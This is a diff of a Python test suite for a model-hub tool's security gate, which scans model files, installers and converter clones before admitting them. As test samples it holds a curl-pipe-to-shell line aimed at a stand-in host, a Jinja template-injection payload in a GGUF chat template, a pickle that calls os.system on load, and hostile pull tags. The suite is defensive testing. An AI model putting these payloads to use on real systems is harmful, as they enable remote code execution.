@@ -12,6 +12,8 @@ import json
 import os
 import re
 import shutil
+import contextlib
+import types
 import subprocess
 import sys
 import tempfile
@@ -149,7 +151,8 @@ class NewVerbContractTests(unittest.TestCase):
         self.assertEqual(obj["command"], "fit")
         self.assertTrue(obj["ok"], msg=obj.get("error"))
         self.assertEqual(code, 0)
-        self.assertEqual(obj["params_b"], 8.0)
+        # the catalogue now carries the published safetensors count (8.19B), not the marketing "8B"
+        self.assertAlmostEqual(obj["params_b"], 8.2, places=1)
         self.assertIsInstance(obj["ranked"], list)
         self.assertGreater(len(obj["ranked"]), 0)
         self.assertIsInstance(obj["reasons"], list)
@@ -239,6 +242,7 @@ class NewVerbContractTests(unittest.TestCase):
 import os  # noqa: E402
 
 sys.path.insert(0, str(HERE))
+import _test_stores  # noqa: E402,F401 — every model store is a temp dir
 import fit as fitmod  # noqa: E402
 import serve as servemod  # noqa: E402
 import nemesis_gate  # noqa: E402
@@ -336,13 +340,20 @@ class ServeArgvTests(unittest.TestCase):
         fit = {"verdict": "OVERFLOW", "ratio": 2.0, "fmt": "awq"}
         p = servemod.build_serve_profile(
             model_id="llama3.3-70b", quant="awq-4bit", runner="vllm", fit=fit,
-            hf_id="meta-llama/Llama-3.3-70B-Instruct", ctx_len=8192,
-            gpu_count=4, caps={"accel": "cuda", "fp8": True})
+            hf_id="meta-llama/Llama-3.3-70B-Instruct", model_dir="/models/admitted/llama",
+            ctx_len=8192, gpu_count=4, caps={"accel": "cuda", "fp8": True})
         self.assertEqual(p["args"]["tensor_parallel"], 4)
+        # the ADMITTED local directory, never the repo id (vLLM would download it itself)
+        self.assertEqual(p["argv"][2], "/models/admitted/llama")
+        self.assertNotIn("meta-llama/Llama-3.3-70B-Instruct", p["argv"])
+        self.assertIn("--served-model-name", p["argv"])
         self.assertIn("--tensor-parallel-size", p["argv"])
         self.assertIn("4", p["argv"])
         self.assertIn("--quantization", p["argv"])
         self.assertIn("--kv-cache-dtype", p["argv"])  # fp8 cap → fp8 kv cache
+        with self.assertRaises(ValueError):
+            servemod.build_serve_profile(model_id="x", quant="awq", runner="vllm", fit=fit,
+                                         hf_id="org/x")
 
     def test_ollama_records_pull(self) -> None:
         fit = {"verdict": "FITS", "ratio": 0.2, "fmt": "gguf"}
@@ -358,24 +369,48 @@ class ServeArgvTests(unittest.TestCase):
 # --------------------------------------------------------------------------- #
 import tempfile  # noqa: E402
 
-_BENIGN_GGUF = "this is gguf weight data, not python code\n"
+def _gguf(arch: str = "llama", template: str = "") -> bytes:
+    """A minimal, structurally valid GGUF v3 (no tensors) — nemesis now validates GGUF
+    headers, so a text file merely NAMED .gguf is (correctly) refused as malformed."""
+    def s(b: bytes) -> bytes:
+        return len(b).to_bytes(8, "little") + b
+    kvs = [(b"general.architecture", arch.encode())]
+    if template:
+        kvs.append((b"tokenizer.chat_template", template.encode()))
+    out = b"GGUF" + (3).to_bytes(4, "little") + (0).to_bytes(8, "little")
+    out += len(kvs).to_bytes(8, "little")
+    for k, v in kvs:
+        out += s(k) + (8).to_bytes(4, "little") + s(v)
+    return out
+
+
+_BENIGN_GGUF = _gguf()
 _MALICIOUS = 'import os\nos.system("curl http://evil.example/x.sh | sh")\n'
 
 
 class GateSpineTests(unittest.TestCase):
     def setUp(self) -> None:
         self.lib = tempfile.mkdtemp(prefix="mh-lib-")
+        # restore (never pop) on teardown: popping removed the run-wide isolation in
+        # _test_stores, and every later test then wrote into the real ~/.prometheus/models
+        self._prev_home = os.environ.get("PROMETHEUS_MODELS_HOME")
         os.environ["PROMETHEUS_MODELS_HOME"] = self.lib
 
     def tearDown(self) -> None:
         import shutil
         shutil.rmtree(self.lib, ignore_errors=True)
-        os.environ.pop("PROMETHEUS_MODELS_HOME", None)
+        if self._prev_home is None:
+            os.environ.pop("PROMETHEUS_MODELS_HOME", None)
+        else:
+            os.environ["PROMETHEUS_MODELS_HOME"] = self._prev_home
 
     def _stage(self, files: dict) -> Path:
         d = Path(tempfile.mkdtemp(prefix="mh-stage-"))
         for name, body in files.items():
-            (d / name).write_text(body, encoding="utf-8")
+            if isinstance(body, bytes):
+                (d / name).write_bytes(body)
+            else:
+                (d / name).write_text(body, encoding="utf-8")
         return d
 
     def test_benign_artifact_is_admitted(self) -> None:
@@ -397,7 +432,9 @@ class GateSpineTests(unittest.TestCase):
         # the staged bytes are quarantined for inspection, NOT auto-deleted
         self.assertIn("quarantined", r)
         self.assertTrue(Path(r["quarantined"]).exists())
-        self.assertFalse(stg.exists())  # moved aside
+        # a staging dir OUTSIDE the stage root is the caller's own directory: the gate works on
+        # a copy and never moves it (2026-11-03 — `--staged ~/Downloads` used to be moved away)
+        self.assertTrue(stg.exists(), "the caller's directory was moved into quarantine")
 
     def test_pickle_format_flagged_high_risk(self) -> None:
         stg = self._stage({"pytorch_model.bin": "fake", "model.safetensors": "safe"})
@@ -416,7 +453,7 @@ class GateSpineTests(unittest.TestCase):
         self.assertEqual(len(r["checksum"]["mismatches"]), 1)
 
     def test_sha256_match_allows_admit(self) -> None:
-        stg = self._stage({"w.gguf": "abc"})
+        stg = self._stage({"w.gguf": _gguf()})
         good = nemesis_gate.sha256_file(stg / "w.gguf")
         r = nemesis_gate.admit("test/goodsha", staging=stg,
                                expected_sha256={"w.gguf": good})
@@ -452,6 +489,104 @@ class GateSpineTests(unittest.TestCase):
     def test_nemesis_gate_returns_error_on_missing_target(self) -> None:
         v = nemesis_gate.nemesis_gate("/tmp/__no_such_target_modelhub_xyz__")
         self.assertEqual(v["verdict"], "error")
+
+    # --- hardening 2026-11-02 ------------------------------------------------- #
+    def test_text_named_gguf_is_refused_as_malformed(self) -> None:
+        stg = self._stage({"model.gguf": "this is not a gguf header\n"})
+        r = nemesis_gate.admit("test/fake-gguf", staging=stg)
+        self.assertFalse(r["admitted"])
+        self.assertIn("MODEL-MALFORMED", r.get("model_findings", []))
+
+    def test_gguf_template_injection_is_refused(self) -> None:
+        evil = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+        stg = self._stage({"model.gguf": _gguf(template=evil)})
+        r = nemesis_gate.admit("test/ssti", staging=stg)
+        self.assertFalse(r["admitted"])
+        self.assertIn("GGUF-TEMPLATE", r.get("model_findings", []))
+
+    def test_benign_chat_template_is_admitted(self) -> None:
+        ok = "{% for m in messages %}<|{{ m['role'] }}|>{{ m['content'] }}{% endfor %}"
+        stg = self._stage({"model.gguf": _gguf(template=ok)})
+        r = nemesis_gate.admit("test/tmpl-ok", staging=stg)
+        self.assertTrue(r["admitted"], r)
+
+    def test_malicious_pickle_weights_are_refused(self) -> None:
+        import pickle
+
+        class Evil:
+            def __reduce__(self):
+                import os
+                return (os.system, ("echo pwned",))
+        stg = self._stage({"pytorch_model.bin": pickle.dumps(Evil(), protocol=2)})
+        r = nemesis_gate.admit("test/evil-pickle", staging=stg)
+        self.assertFalse(r["admitted"])
+        self.assertIn("PICKLE-RCE", r.get("model_findings", []))
+
+    def test_tensor_only_pickle_needs_confirmation_then_is_admitted_with_risk_flag(self) -> None:
+        # A clean opcode walk is strong evidence, not proof: a pickle is code on load, so even
+        # an ALLOW over one waits for the operator (review 2026-11-02).
+        import collections
+        import pickle
+        body = pickle.dumps(collections.OrderedDict(w=[1.0, 2.0]), protocol=2)
+        stg = self._stage({"pytorch_model.bin": body})
+        r = nemesis_gate.admit("test/plain-pickle", staging=stg)
+        self.assertFalse(r["admitted"], r)
+        self.assertTrue(r.get("needs_confirm"), r)
+        r = nemesis_gate.admit("test/plain-pickle", staging=stg, force=True)
+        self.assertTrue(r["admitted"], r)
+        self.assertEqual(r["format_risk"]["risk"], "high")
+
+    def test_remote_code_needs_confirmation(self) -> None:
+        stg = self._stage({"model.gguf": _gguf(), "modeling_custom.py": "x = 1\n"})
+        r = nemesis_gate.admit("test/remote-code", staging=stg)
+        self.assertFalse(r["admitted"])
+        self.assertTrue(r.get("needs_confirm"))
+        self.assertIn("modeling_custom.py", r["format_risk"]["code_files"])
+
+    def test_stage_modified_during_scan_is_refused(self) -> None:
+        stg = self._stage({"model.gguf": _gguf()})
+        original = nemesis_gate.nemesis_gate
+
+        def tamper(target: str) -> dict:
+            (Path(target) / "model.gguf").write_bytes(_gguf(arch="swapped-after-scan"))
+            return {"verdict": "allow", "risk_score": 0}
+        try:
+            nemesis_gate.nemesis_gate = tamper  # type: ignore[assignment]
+            r = nemesis_gate.admit("test/toctou", staging=stg)
+        finally:
+            nemesis_gate.nemesis_gate = original  # type: ignore[assignment]
+        self.assertFalse(r["admitted"])
+        self.assertTrue(r["blocked"])
+
+    def test_unknown_verdict_strings_fail_closed(self) -> None:
+        for v in ("ALLOW", "pending", "", None, "allowed"):
+            out = nemesis_gate.reconcile_verdict({"verdict": v}, 0)
+            self.assertEqual(out["verdict"], "error", v)
+
+    def test_exit_code_stricter_than_stdout_wins(self) -> None:
+        out = nemesis_gate.reconcile_verdict({"verdict": "allow"}, 20)
+        self.assertEqual(out["verdict"], "block")
+        out = nemesis_gate.reconcile_verdict({"verdict": "allow"}, 7)
+        self.assertEqual(out["verdict"], "error")
+        out = nemesis_gate.reconcile_verdict({"verdict": "block"}, 0)
+        self.assertEqual(out["verdict"], "block")
+
+    def test_unknown_verdict_from_stub_is_not_admitted(self) -> None:
+        stg = self._stage({"model.gguf": _gguf()})
+        original = nemesis_gate.nemesis_gate
+        try:
+            nemesis_gate.nemesis_gate = lambda t: {"verdict": "pending"}  # type: ignore
+            r = nemesis_gate.admit("test/pending", staging=stg)
+        finally:
+            nemesis_gate.nemesis_gate = original  # type: ignore[assignment]
+        self.assertFalse(r["admitted"])
+
+    def test_safe_id_never_resolves_to_the_stage_root(self) -> None:
+        for bad in ("", ".", "..", "./", "../x", "a/../..", "\\.."):
+            sid = nemesis_gate._safe_id(bad)
+            self.assertNotIn(sid, ("", ".", ".."))
+            self.assertFalse(sid.startswith("."), bad)
+            self.assertNotIn("/", sid)
 
 
 class RemoveUnserveAliasTests(unittest.TestCase):
@@ -663,15 +798,50 @@ class PullTests(unittest.TestCase):
         self.assertEqual(obj["runner"], "ollama")
         self.assertIn("install", obj)
 
+    def _fake_store(self, template: str = "") -> str:
+        """A fake Ollama store holding qwen2.5:3b, so the post-pull gate has blobs to scan."""
+        import hashlib
+        import os
+        import tempfile
+        root = tempfile.mkdtemp(prefix="ollama-store-")
+        self.addCleanup(__import__("shutil").rmtree, root, True)
+
+        def s(b: bytes) -> bytes:
+            return len(b).to_bytes(8, "little") + b
+        kvs = [(b"general.architecture", b"qwen2")]
+        if template:
+            kvs.append((b"tokenizer.chat_template", template.encode()))
+        gguf = b"GGUF" + (3).to_bytes(4, "little") + (0).to_bytes(8, "little")
+        gguf += len(kvs).to_bytes(8, "little")
+        for k, v in kvs:
+            gguf += s(k) + (8).to_bytes(4, "little") + s(v)
+        digest = hashlib.sha256(gguf).hexdigest()
+        # the gate's digest ledger lives under the model library: keep it in a temp dir too
+        prev = os.environ.get("PROMETHEUS_MODELS_HOME")
+        os.environ["PROMETHEUS_MODELS_HOME"] = os.path.join(root, "prom-lib")
+        self.addCleanup(lambda: os.environ.__setitem__("PROMETHEUS_MODELS_HOME", prev)
+                        if prev is not None else os.environ.pop("PROMETHEUS_MODELS_HOME", None))
+        os.makedirs(os.path.join(root, "blobs"))
+        with open(os.path.join(root, "blobs", "sha256-" + digest), "wb") as fh:
+            fh.write(gguf)
+        mdir = os.path.join(root, "manifests", "registry.ollama.ai", "library", "qwen2.5")
+        os.makedirs(mdir)
+        with open(os.path.join(mdir, "3b"), "w") as fh:
+            json.dump({"layers": [{"mediaType": "application/vnd.ollama.image.model",
+                                   "digest": "sha256:" + digest}]}, fh)
+        return root
+
     def test_pull_success_streams_progress(self) -> None:
         obj, stderr, code = run_verb_env(
             {
                 "MODELHUB_FAKE_OLLAMA": "1",
                 "MODELHUB_FAKE_PULL_LINES": "pulling manifest\npulling 42%\npulling 100%\nsuccess",
                 "MODELHUB_FAKE_PULL_CODE": "0",
+                "MODELHUB_OLLAMA_MODELS": self._fake_store(),
             },
             "pull", "--id", "demo", "--tag", "qwen2.5:3b",
         )
+        self.assertEqual(obj.get("gate", {}).get("verdict"), "allow", msg=obj)
         self.assertTrue(obj["ok"], msg=obj.get("error"))
         self.assertEqual(code, 0)
         self.assertTrue(obj["installed"])
@@ -682,6 +852,32 @@ class PullTests(unittest.TestCase):
         prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
         self.assertTrue(prog, msg="expected progress JSON-lines on stderr")
         self.assertEqual(max(p["pct"] for p in prog), 100)
+
+    def test_pull_of_a_poisoned_model_is_removed(self) -> None:
+        obj, stderr, code = run_verb_env(
+            {
+                "MODELHUB_FAKE_OLLAMA": "1",
+                "MODELHUB_FAKE_PULL_LINES": "success",
+                "MODELHUB_FAKE_PULL_CODE": "0",
+                "MODELHUB_FAKE_OLLAMA_CMD_CODE": "0",
+                "MODELHUB_OLLAMA_MODELS": self._fake_store(
+                    "{{ cycler.__init__.__globals__.os.popen('id').read() }}"),
+            },
+            "pull", "--id", "demo", "--tag", "qwen2.5:3b",
+        )
+        self.assertFalse(obj["ok"])
+        self.assertEqual(code, 2)
+        self.assertEqual(obj["gate"]["verdict"], "block")
+        self.assertTrue(obj["gate"]["removed"])
+        self.assertIn('"rm"', stderr)
+
+    def test_pull_refuses_host_qualified_tags(self) -> None:
+        for tag in ("hf.co/someone/evil-GGUF:Q4_K_M", "huggingface.co/x/y", "evil.example/m:1",
+                    "-rf", "Qwen/../x"):
+            obj, _stderr, code = run_verb_env(
+                {"MODELHUB_FAKE_OLLAMA": "1"}, "pull", "--id", "demo", "--tag", tag)
+            self.assertFalse(obj["ok"], tag)
+            self.assertEqual(code, 2, tag)
 
     def test_pull_failure_surfaces_exit_code(self) -> None:
         obj, _stderr, code = run_verb_env(
@@ -911,25 +1107,41 @@ class InstallRunnerTests(unittest.TestCase):
         self.assertTrue(obj["manual"])
         self.assertEqual(obj["os"], "windows")
 
-    def test_linux_runs_installer_and_streams(self) -> None:
+    def test_linux_never_runs_the_vendor_script(self) -> None:
+        # Ollama's Linux installer is `curl … | sh` as root: Prometheus hands it to the human.
         obj, stderr, code = run_verb_env(
             {
                 "MODELHUB_FORCE_OS": "linux",
                 "MODELHUB_FORCE_NO_OLLAMA": "1",
-                "MODELHUB_FAKE_INSTALL_LINES": ">>> downloading ollama\n>>> installing to /usr/local/bin",
+                "MODELHUB_FORCE_NO_BREW": "1",
+                "MODELHUB_FAKE_INSTALL_LINES": ">>> this must never run",
+                "MODELHUB_FAKE_INSTALL_CODE": "0",
+            },
+            "install-runner",
+        )
+        self.assertFalse(obj["ok"])
+        self.assertEqual(code, 2)
+        self.assertTrue(obj["manual"])
+        self.assertIn("install.sh", obj["install"])
+        self.assertNotIn("this must never run", stderr)
+
+    def test_linux_with_homebrew_installs_the_formula_and_streams(self) -> None:
+        brew = shutil.which("brew") or "/opt/homebrew/bin/brew"
+        if not os.path.exists(brew):
+            self.skipTest("no Homebrew on this machine")
+        obj, stderr, code = run_verb_env(
+            {
+                "MODELHUB_FORCE_OS": "linux",
+                "MODELHUB_FORCE_NO_OLLAMA": "1",
+                "MODELHUB_FAKE_INSTALL_LINES": "==> Pouring ollama bottle",
                 "MODELHUB_FAKE_INSTALL_CODE": "0",
                 "MODELHUB_FAKE_INSTALL_OK": "1",
             },
             "install-runner",
         )
         self.assertTrue(obj["ok"], msg=obj.get("error"))
-        self.assertEqual(code, 0)
-        self.assertTrue(obj["installed"])
-        self.assertEqual(obj["os"], "linux")
-        self.assertIn("install.sh", obj["cmdline"])
-        # the installer output streamed to stderr as progress JSON-lines
+        self.assertIn("install --formula ollama", obj["cmdline"])
         prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
-        self.assertTrue(prog, msg="expected install progress JSON-lines on stderr")
         self.assertTrue(any(p.get("verb") == "install-runner" for p in prog))
 
     def test_linux_installer_failure_is_actionable(self) -> None:
@@ -995,6 +1207,20 @@ class DiskCheckTests(unittest.TestCase):
 # /hug — fetch HF's OWN `hf` CLI (env-stubbed: no real pip, no network)
 # --------------------------------------------------------------------------- #
 
+def _fake_nemesis(dirpath: str, verdict: str = "allow") -> str:
+    """A stand-in nemesis that prints one verdict — the gate's real fail-closed parsing
+    (reconcile_verdict: stdout verdict and exit code must agree) still runs on it."""
+    code = {"allow": 0, "warn": 10, "block": 20, "error": 2}[verdict]
+    p = Path(dirpath) / "fake_nemesis.py"
+    p.write_text(
+        "import json, sys\n"
+        f"print(json.dumps({{'verdict': {verdict!r}, 'risk_score': 0, 'blocking_reasons': []}}))\n"
+        f"sys.exit({code})\n",
+        encoding="utf-8",
+    )
+    return str(p)
+
+
 class InstallHfCliTests(unittest.TestCase):
     def test_already_available_is_idempotent(self) -> None:
         obj, _stderr, code = run_verb_env({"MODELHUB_FAKE_HF_CLI": "1"}, "install-hf-cli")
@@ -1011,31 +1237,70 @@ class InstallHfCliTests(unittest.TestCase):
         self.assertEqual(code, 2)
         self.assertTrue(obj["manual"])
 
-    def test_install_success(self) -> None:
-        obj, _stderr, code = run_verb_env(
-            {
-                "MODELHUB_FORCE_NO_HF_CLI": "1",
-                "MODELHUB_FAKE_INSTALL_LINES": "Installing huggingface_hub...\ndone",
-                "MODELHUB_FAKE_INSTALL_CODE": "0",
-                "MODELHUB_FAKE_INSTALL_OK": "1",
-            },
-            "install-hf-cli",
-        )
-        self.assertTrue(obj["ok"], msg=obj.get("error"))
-        self.assertEqual(code, 0)
-        self.assertTrue(obj["installed"])
+    def _env(self, tmp: str, verdict: str = "allow", code: str = "0") -> dict:
+        return {
+            "MODELHUB_FORCE_NO_HF_CLI": "1",
+            "MODELHUB_FAKE_INSTALL_LINES": "Installing huggingface_hub...\ndone",
+            "MODELHUB_FAKE_INSTALL_CODE": code,
+            "MODELHUB_FAKE_INSTALL_OK": "1",
+            "PROMETHEUS_TOOLS_DIR": tmp,
+            "NEMESIS_BIN": _fake_nemesis(tmp, verdict),
+        }
+
+    def test_install_success_is_pinned_gated_and_isolated(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(self._env(tmp), "install-hf-cli")
+            self.assertTrue(obj["ok"], msg=obj.get("error"))
+            self.assertEqual(code, 0)
+            self.assertTrue(obj["installed"])
+            # an exact version, never "whatever PyPI serves" — and never the user's own Python
+            self.assertRegex(obj["pin"], r"^huggingface_hub==\d+\.\d+\.\d+$")
+            self.assertTrue(obj["venv"].startswith(tmp))
+            self.assertEqual(obj["gate"]["verdict"], "allow")
 
     def test_install_failure(self) -> None:
-        obj, _stderr, code = run_verb_env(
-            {
-                "MODELHUB_FORCE_NO_HF_CLI": "1",
-                "MODELHUB_FAKE_INSTALL_LINES": "ERROR: could not find a version",
-                "MODELHUB_FAKE_INSTALL_CODE": "1",
-            },
-            "install-hf-cli",
-        )
-        self.assertFalse(obj["ok"])
-        self.assertEqual(code, 2)
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(self._env(tmp, code="1"), "install-hf-cli")
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+
+    def test_nemesis_block_refuses_the_install(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(self._env(tmp, verdict="block"), "install-hf-cli")
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertTrue(obj["blocked"])
+            self.assertIn("BLOCK", obj["error"])
+
+    def test_nemesis_warn_needs_force(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(self._env(tmp, verdict="warn"), "install-hf-cli")
+            self.assertFalse(obj["ok"])
+            self.assertTrue(obj["needs_confirm"])
+            obj, _stderr, code = run_verb_env(self._env(tmp, verdict="warn"), "install-hf-cli", "--force")
+            self.assertTrue(obj["ok"], msg=obj.get("error"))
+            self.assertTrue(obj["forced"])
+
+    def test_unparseable_verdict_fails_closed_even_with_force(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            env = self._env(tmp)
+            bogus = Path(tmp) / "bogus_nemesis.py"
+            bogus.write_text("import sys; sys.stdout.write('not a verdict\\n')\n", encoding="utf-8")
+            env["NEMESIS_BIN"] = str(bogus)
+            obj, _stderr, code = run_verb_env(env, "install-hf-cli", "--force")
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertEqual(obj["verdict"], "error")
+
+    def test_fake_seam_never_touches_the_real_tools_dir(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            env = self._env(tmp)
+            # empty, not popped: run_verb_env merges os.environ, where _test_stores now forces
+            # PROMETHEUS_TOOLS_DIR to a temp dir for every test
+            env["PROMETHEUS_TOOLS_DIR"] = ""
+            obj, _stderr, code = run_verb_env(env, "install-hf-cli")
+            self.assertFalse(obj["ok"])
+            self.assertIn("PROMETHEUS_TOOLS_DIR", obj["error"])
 
 
 # --------------------------------------------------------------------------- #
@@ -1090,6 +1355,25 @@ class FetchHfTests(unittest.TestCase):
             prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
             self.assertTrue(any(p.get("phase") == "fetch-hf" for p in prog))
 
+    def test_without_out_the_source_lands_in_the_hf_cache_and_is_marked_as_scratch(self) -> None:
+        obj, _stderr, code = run_verb_env(
+            {
+                "MODELHUB_FAKE_HF_CLI": "1",
+                "MODELHUB_FAKE_CONVERT_LINES": "Fetching 12 files\ndone",
+                "MODELHUB_FAKE_CONVERT_CODE": "0",
+            },
+            "fetch-hf", "--repo", "acme/fresh-model",
+        )
+        self.assertTrue(obj["ok"], msg=obj.get("error"))
+        snap = Path(obj["path"])
+        hub = Path(os.environ["HF_HUB_CACHE"]).resolve()
+        self.assertIn(hub, snap.resolve().parents, "the HF cache, not a stage copy")
+        self.assertTrue((snap / ".prometheus-fetched-for-convert").is_file())
+        sys.path.insert(0, str(HERE))
+        import model_place  # noqa: E402
+        self.assertGreater(model_place.drop_snapshot(snap) + 1, 0)
+        self.assertFalse((hub / "models--acme--fresh-model").exists(), "scratch removed after use")
+
     def test_fetch_failure(self) -> None:
         with tempfile.TemporaryDirectory() as out:
             obj, _stderr, code = run_verb_env(
@@ -1133,35 +1417,78 @@ class InstallConverterTests(unittest.TestCase):
             self.assertTrue(obj["manual"])
             self.assertIn("git", obj["error"])
 
+    def _env(self, tmp: str, verdict: str = "allow", **extra: str) -> dict:
+        env = {
+            "MODELHUB_FORCE_LLAMACPP_DIR": str(Path(tmp) / "llama.cpp"),
+            "MODELHUB_FAKE_GIT": "1",
+            "MODELHUB_FAKE_INSTALL_LINES": "Cloning into 'llama.cpp'...\ndone",
+            "MODELHUB_FAKE_INSTALL_CODE": "0",
+            "PROMETHEUS_TOOLS_DIR": str(Path(tmp) / "tools"),
+            "NEMESIS_BIN": _fake_nemesis(tmp, verdict),
+        }
+        env.update(extra)
+        return env
+
     def test_clone_success_streams_progress(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            dest = str(Path(tmp) / "llama.cpp")
-            obj, stderr, code = run_verb_env(
-                {
-                    "MODELHUB_FORCE_LLAMACPP_DIR": dest,
-                    "MODELHUB_FAKE_GIT": "1",
-                    "MODELHUB_FAKE_INSTALL_LINES": "Cloning into 'llama.cpp'...\ndone",
-                    "MODELHUB_FAKE_INSTALL_CODE": "0",
-                },
-                "install-converter",
-            )
+            obj, stderr, code = run_verb_env(self._env(tmp), "install-converter")
             self.assertTrue(obj["ok"], msg=obj.get("error"))
             self.assertEqual(code, 0)
             self.assertTrue(obj["installed"])
             self.assertTrue(Path(obj["path"]).is_file())
             prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
             self.assertTrue(prog, msg="expected install progress JSON-lines on stderr")
+            # pinned to a commit, recorded, and its deps went into Prometheus's own venv
+            self.assertRegex(obj["commit"], r"^[0-9a-f]{40}$")
+            pin = json.loads((Path(tmp) / "llama.cpp" / ".prometheus-pin.json").read_text())
+            self.assertEqual(pin["commit"], obj["commit"])
+            self.assertTrue((Path(tmp) / "tools" / "convert-venv" / ".prometheus-deps.json").is_file())
+            # a second call is a no-op
+            obj2, _stderr, _code = run_verb_env(self._env(tmp), "install-converter")
+            self.assertIn("already available", obj2["note"])
+
+    def test_moved_tag_is_refused(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(
+                self._env(tmp, MODELHUB_FAKE_GIT_HEAD="0" * 40), "install-converter",
+            )
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertIn("pinned commit", obj["error"])
+            self.assertFalse((Path(tmp) / "llama.cpp").exists())
+
+    def test_nemesis_block_never_promotes_the_clone(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, code = run_verb_env(self._env(tmp, verdict="block"), "install-converter")
+            self.assertFalse(obj["ok"])
+            self.assertEqual(code, 2)
+            self.assertTrue(obj["blocked"])
+            self.assertFalse((Path(tmp) / "llama.cpp").exists())
+            # and no staging dir is left behind
+            self.assertEqual([p.name for p in Path(tmp).iterdir() if p.name.startswith(".llama")], [])
+
+    def test_warn_needs_force(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            obj, _stderr, _code = run_verb_env(self._env(tmp, verdict="warn"), "install-converter")
+            self.assertFalse(obj["ok"])
+            self.assertTrue(obj["needs_confirm"])
+            self.assertFalse((Path(tmp) / "llama.cpp").exists())
+
+    def test_user_managed_checkout_runs_with_the_current_python(self) -> None:
+        # a $LLAMACPP_DIR the user cloned themselves has no pin file: deps are theirs
+        with tempfile.TemporaryDirectory() as tmp:
+            d = Path(tmp) / "llama.cpp"
+            d.mkdir()
+            (d / "convert_hf_to_gguf.py").write_text("# user's own\n")
+            obj, _stderr, code = run_verb_env(self._env(tmp), "install-converter")
+            self.assertTrue(obj["ok"], msg=obj.get("error"))
+            self.assertIn("already available", obj["note"])
 
     def test_clone_failure_is_actionable(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
-            dest = str(Path(tmp) / "llama.cpp")
             obj, _stderr, code = run_verb_env(
-                {
-                    "MODELHUB_FORCE_LLAMACPP_DIR": dest,
-                    "MODELHUB_FAKE_GIT": "1",
-                    "MODELHUB_FAKE_INSTALL_LINES": "fatal: unable to access repository",
-                    "MODELHUB_FAKE_INSTALL_CODE": "128",
-                },
+                self._env(tmp, MODELHUB_FAKE_INSTALL_LINES="fatal: unable to access repository",
+                          MODELHUB_FAKE_INSTALL_CODE="128"),
                 "install-converter",
             )
             self.assertFalse(obj["ok"])
@@ -1174,6 +1501,22 @@ class InstallConverterTests(unittest.TestCase):
 # --------------------------------------------------------------------------- #
 
 class ConvertTests(unittest.TestCase):
+    """`convert` now admits its OWN output through nemesis — a stand-in nemesis decides here
+    (its verdict is still parsed fail-closed by the real gate code)."""
+
+    def setUp(self) -> None:
+        self._nem = tempfile.mkdtemp(prefix="conv-nemesis-")
+        self._prev_nem = os.environ.get("NEMESIS_BIN")
+        os.environ["NEMESIS_BIN"] = _fake_nemesis(self._nem, "allow")
+
+    def tearDown(self) -> None:
+        import shutil
+        shutil.rmtree(self._nem, ignore_errors=True)
+        if self._prev_nem is None:
+            os.environ.pop("NEMESIS_BIN", None)
+        else:
+            os.environ["NEMESIS_BIN"] = self._prev_nem
+
     def _stub_converter_dir(self, tmp: str) -> str:
         d = Path(tmp) / "llama.cpp"
         d.mkdir(parents=True, exist_ok=True)
@@ -1240,34 +1583,29 @@ class ConvertTests(unittest.TestCase):
             # fp32 aliases to f32 (the real --outtype value convert_hf_to_gguf.py accepts)
             self.assertTrue(obj2["path"].endswith("-f32.gguf"), obj2["path"])
 
-    def test_relative_out_still_leaves_a_resolvable_canonical_symlink(self) -> None:
-        # Regression test: a relative --out used to leave the canonical symlink
-        # pointing at a relative target, which the OS resolves against the symlink's
-        # own parent dir (not this process's cwd) — a dangling symlink.
+    def test_converted_output_is_admitted_and_no_models_dir_copy_is_left(self) -> None:
+        # The output used to stay in a Prometheus models dir (plus a "canonical" symlink there),
+        # unscanned. It is now admitted by nemesis and waits in the gate as a transit copy that
+        # install-target moves into the runtime's own folder.
         with tempfile.TemporaryDirectory() as tmp, tempfile.TemporaryDirectory() as src, \
-                tempfile.TemporaryDirectory() as canonical, tempfile.TemporaryDirectory() as alt_parent:
+                tempfile.TemporaryDirectory() as canonical, tempfile.TemporaryDirectory() as out:
             conv_dir = self._stub_converter_dir(tmp)
-            rel_out = "relative-alt-disk"
-            cwd = os.getcwd()
-            os.chdir(alt_parent)
-            try:
-                obj, _stderr, code = run_verb_env(
-                    {
-                        "MODELHUB_FORCE_LLAMACPP_DIR": conv_dir,
-                        "MODELHUB_FAKE_CONVERT_LINES": "ok",
-                        "PROMETHEUS_MODELS_DIR": canonical,
-                    },
-                    "convert", "--src", src, "--out", rel_out, "--quant", "f16", "--id", "acme/tiny",
-                )
-            finally:
-                os.chdir(cwd)
+            obj, _stderr, code = run_verb_env(
+                {
+                    "MODELHUB_FORCE_LLAMACPP_DIR": conv_dir,
+                    "MODELHUB_FAKE_CONVERT_LINES": "ok",
+                    "PROMETHEUS_MODELS_DIR": canonical,
+                },
+                "convert", "--src", src, "--out", out, "--quant", "f16", "--id", "acme/tiny",
+            )
             self.assertTrue(obj["ok"], msg=obj.get("error"))
             self.assertEqual(code, 0)
-            canonical_path = Path(obj["canonical_path"])
-            self.assertTrue(canonical_path.is_symlink())
-            # the symlink must actually resolve to a REAL file, not dangle
-            self.assertTrue(canonical_path.resolve().is_file(), "canonical symlink is dangling")
-            self.assertEqual(canonical_path.resolve(), Path(obj["path"]).resolve())
+            self.assertTrue(obj.get("transit"))
